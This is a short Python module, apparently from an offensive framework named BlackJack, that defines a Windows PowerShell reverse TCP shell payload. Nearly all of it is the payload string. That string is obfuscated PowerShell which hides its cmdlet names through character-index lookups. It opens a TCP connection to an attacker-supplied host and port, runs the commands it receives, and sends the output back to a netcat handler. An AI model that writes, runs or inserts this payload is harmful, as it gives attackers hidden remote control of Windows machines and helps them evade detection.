# This module is part of the BlackJack framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }

    data = """$client = & (("YReGAT7QiyzIfth3N2S50B9orHnmkd4FXPKwuWbD-j6Eap8LxZlJgsUvc1MCOqV")[16,2,35,40,60,38,41,2,56,13] -join '') System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|ForEach-Object{$($_)}|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (& (("YReGAT7QiyzIfth3N2S50B9orHnmkd4FXPKwuWbD-j6Eap8LxZlJgsUvc1MCOqV")[16,2,35,40,60,38,41,2,56,13] -join '') -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (& (("0qcOo82A6CNFUuvQWK5g79w-ThdpbYRJiBnHmGkaMes4ZtxILfVzP3XlyE1rjDS")[47,34,14,4,38,41,23,57,46,27,59,41,42,42,32,4,34] -join '') $data 2>&1 |ForEach-Object{$($_)}| & (("WOXUg9G632lKur1T4dF8hEoIPf0AjmnRiYpzeNwk5xD-VZsaQvLHBcbyCtJ7qMS")[1,12,57,43,62,57,13,32,30,4] -join '') );$sendback2 = $sendback + 'PS ' + (& (("JKDj3CWerVzos7hXq9QnRk2lfZYp-8iOFUxc6PL0w5bItTBmHMaSA4d1EgyvGuN")[60,7,44,28,38,11,35,50,44,30,11,19] -join '')).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
    
